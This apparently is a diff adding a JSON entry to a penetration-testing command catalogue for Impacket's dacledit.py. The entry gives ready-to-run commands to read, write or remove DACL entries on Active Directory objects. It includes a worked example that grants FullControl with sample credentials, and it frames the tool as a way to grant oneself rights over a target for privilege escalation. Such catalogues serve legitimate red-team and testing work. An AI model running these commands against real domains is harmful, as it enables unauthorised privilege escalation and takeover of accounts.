@@ -1,0 +1,20 @@
+{
+  "id": "impacket-dacledit",
+  "name": "Impacket dacledit.py",
+  "command": "impacket-dacledit -action write -rights FullControl -principal '<attacker>' -target '<victim>' '<domain>/<user>:<password>'",
+  "description": "Read, write, or remove DACL ACEs on AD objects from Linux. Use to grant yourself GenericAll/WriteDacl over a target user, group, or computer once you have an ACL-write primitive.",
+  "platform": "linux",
+  "requires": ["password"],
+  "protocols": ["ldap"],
+  "tags": ["impacket", "dacledit", "acl", "dacl", "privilege-escalation"],
+  "variations": [
+    { "label": "Read DACL", "requires": "password", "command": "impacket-dacledit -action read -target '<victim>' '<domain>/<user>:<password>'" },
+    { "label": "Remove ACE", "requires": "password", "command": "impacket-dacledit -action remove -rights FullControl -principal '<attacker>' -target '<victim>' '<domain>/<user>:<password>'" }
+  ],
+  "references": [
+    { "title": "Impacket dacledit", "url": "https://github.com/fortra/impacket/blob/master/examples/dacledit.py" }
+  ],
+  "examples": [
+    "impacket-dacledit -action write -rights FullControl -principal jdoe -target itadmin corp.local/jdoe:'Password123!'"
+  ]
+}
